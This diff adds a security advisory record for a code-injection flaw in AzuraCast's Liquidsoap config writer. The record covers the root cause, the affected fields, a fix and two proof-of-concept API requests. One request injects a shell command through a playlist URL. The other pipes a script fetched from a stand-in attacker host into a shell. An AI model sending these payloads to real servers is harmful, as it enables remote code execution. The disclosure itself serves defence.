@@ -1,0 +1,70 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-93fx-5qgc-wr38",
+  "modified": "2026-03-09T19:55:00Z",
+  "published": "2026-03-09T19:55:00Z",
+  "aliases": [],
+  "summary": "AzuraCast: RCE via Liquidsoap string interpolation injection in station metadata and playlist URLs",
+  "details": "## Summary\n\nAzuraCast's `ConfigWriter::cleanUpString()` method fails to sanitize Liquidsoap string interpolation sequences (`#{...}`), allowing authenticated users with `StationPermissions::Media` or `StationPermissions::Profile` permissions to inject arbitrary Liquidsoap code into the generated configuration file. When the station is restarted and Liquidsoap parses the config, `#{...}` expressions are evaluated, enabling arbitrary command execution via Liquidsoap's `process.run()` function.\n\n## Root Cause\n\n**File:** `backend/src/Radio/Backend/Liquidsoap/ConfigWriter.php`, line ~1345\n\n```php\npublic static function cleanUpString(?string $string): string\n{\n    return str_replace(['\"', \"\\n\", \"\\r\"], ['\\'', '', ''], $string ?? '');\n}\n```\n\nThis function only replaces `\"` with `'` and strips newlines. It does **NOT** filter:\n- `#{...}` — Liquidsoap string interpolation (evaluated as code inside double-quoted strings)\n- `\\` — Backslash escape character\n\nLiquidsoap, like Ruby, evaluates `#{expression}` inside double-quoted strings. `process.run()` in Liquidsoap executes shell commands.\n\n## Injection Points\n\nAll user-controllable fields that pass through `cleanUpString()` and are embedded in double-quoted strings in the `.liq` config:\n\n| Field | Permission Required | Config Line |\n|---|---|---|\n| `playlist.remote_url` | `Media` | `input.http(\"...\")` or `playlist(\"...\")` |\n| `station.name` | `Profile` | `name = \"...\"` |\n| `station.description` | `Profile` | `description = \"...\"` |\n| `station.genre` | `Profile` | `genre = \"...\"` |\n| `station.url` | `Profile` | `url = \"...\"` |\n| `backend_config.live_broadcast_text` | `Profile` | `settings.azuracast.live_broadcast_text := \"...\"` |\n| `backend_config.dj_mount_point` | `Profile` | `input.harbor(\"...\")` |\n\n## PoC 1: Via Remote Playlist URL (Media permission)\n\n```http\nPOST /api/station/1/playlists HTTP/1.1\nContent-Type: application/json\nAuthorization: Bearer <API_KEY_WITH_MEDIA_PERMISSION>\n\n{\n    \"name\": \"Malicious Remote\",\n    \"source\": \"remote_url\",\n    \"remote_url\": \"http://x#{process.run('id > /tmp/pwned')}.example.com/stream\",\n    \"remote_type\": \"stream\",\n    \"is_enabled\": true\n}\n```\n\nThe generated `liquidsoap.liq` will contain:\n```liquidsoap\nmksafe(buffer(buffer=5., input.http(\"http://x#{process.run('id > /tmp/pwned')}.example.com/stream\")))\n```\n\nWhen Liquidsoap parses this, `process.run('id > /tmp/pwned')` executes as the `azuracast` user.\n\n## PoC 2: Via Station Description (Profile permission)\n\n```http\nPUT /api/station/1/profile/edit HTTP/1.1\nContent-Type: application/json\nAuthorization: Bearer <API_KEY_WITH_PROFILE_PERMISSION>\n\n{\n    \"name\": \"My Station\",\n    \"description\": \"#{process.run('curl http://attacker.com/shell.sh | sh')}\"\n}\n```\n\nGenerates:\n```liquidsoap\ndescription = \"#{process.run('curl http://attacker.com/shell.sh | sh')}\"\n```\n\n## Trigger Condition\n\nThe injection fires when the station is restarted, which happens during:\n- Normal station restart by any user with `Broadcasting` permission\n- System updates and maintenance\n- `azuracast:radio:restart` CLI command\n- Docker container restarts\n\n## Impact\n\n- **Severity:** Critical\n- **Authentication:** Required — any station-level user with `Media` or `Profile` permission\n- **Impact:** Full RCE on the AzuraCast server as the `azuracast` user\n- **CWE:** CWE-94 (Code Injection)\n\n## Recommended Fix\n\nUpdate `cleanUpString()` to escape `#` and `\\`:\n\n```php\npublic static function cleanUpString(?string $string): string\n{\n    return str_replace(\n        ['\"', \"\\n\", \"\\r\", '\\\\', '#'],\n        ['\\'', '', '', '\\\\\\\\', '\\\\#'],\n        $string ?? ''\n    );\n}\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "azuracast/azuracast"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.23.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 0.23.3"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-93fx-5qgc-wr38"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/AzuraCast/AzuraCast/commit/d04b5c55ce0d867bcb87f49f7082bf8edbcd360c"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/AzuraCast/AzuraCast/commit/ff49ef4d0fa571a3661abff6d0a9546ba3ed5df5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/AzuraCast/AzuraCast"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/AzuraCast/AzuraCast/releases/tag/0.23.4"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-03-09T19:55:00Z",
+    "nvd_published_at": null
+  }
+}
